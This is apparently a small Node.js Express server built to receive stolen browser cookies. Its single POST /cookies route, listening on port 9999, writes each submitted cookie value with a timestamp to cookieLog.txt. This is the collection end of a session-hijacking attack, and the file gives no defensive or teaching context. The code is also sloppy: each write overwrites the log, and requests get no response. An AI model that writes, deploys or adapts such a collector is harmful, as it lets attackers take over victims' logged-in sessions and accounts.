var express = require('express')
var bodyParser = require("body-parser")
var fs = require('fs')

var server = express()
server.use(bodyParser.urlencoded({
    "extended": true
}))
server.use(bodyParser.json())

server.post('/cookies', function(req, res) {
    var cookieLog = '[ ' + new Date() + ' ]' + req.body.cookie + '\n'
    fs.writeFile('cookieLog.txt', cookieLog, function(err) {
        console.log('saved!')
    })
})

server.listen(9999, function() {
    console.log('listen 9999')
})
